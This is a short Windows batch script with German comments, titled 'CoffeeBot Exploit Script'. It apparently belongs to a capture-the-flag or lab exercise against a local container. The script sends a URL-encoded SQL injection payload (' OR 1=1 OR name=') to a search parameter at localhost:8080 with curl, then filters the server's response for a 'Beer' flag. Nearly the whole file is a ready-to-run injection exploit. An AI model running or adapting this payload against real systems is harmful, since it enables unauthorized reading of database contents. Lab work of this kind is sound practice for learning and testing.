@echo off
chcp 65001 >nul
title CoffeeBot Exploit Script

:: Konfiguration
set "TARGET_URL=http://127.0.0.1:8080/"

:: URL-encoded Payload: Kaffee' OR 1=1 OR name='
set "PAYLOAD=%%27%%20OR%%201%%3D1%%20OR%%20name%%3D%%27"

echo [*] Sende Exploit-Payload an %TARGET_URL%...

:: Temporäre Datei für die Server-Antwort anlegen
set "TEMP_FILE=%TEMP%\coffeebot_res.html"

:: Request via curl senden und Antwort speichern
curl -s "%TARGET_URL%?search=%PAYLOAD%" > "%TEMP_FILE%"

echo [+] Erfolg! Hier sind die gefundenen Daten:
echo --------------------------------------------------

:: Nach dem Wort "Beer" filtern (Groß-/Kleinschreibung ignorieren)
findstr /I "Beer" "%TEMP_FILE%"

if %ERRORLEVEL% NEQ 0 (
    echo [-] Keine Flagge gefunden. Prüfe, ob der Container läuft.
)

echo --------------------------------------------------

:: Aufräumen
del "%TEMP_FILE%" >nul 2>&1
pause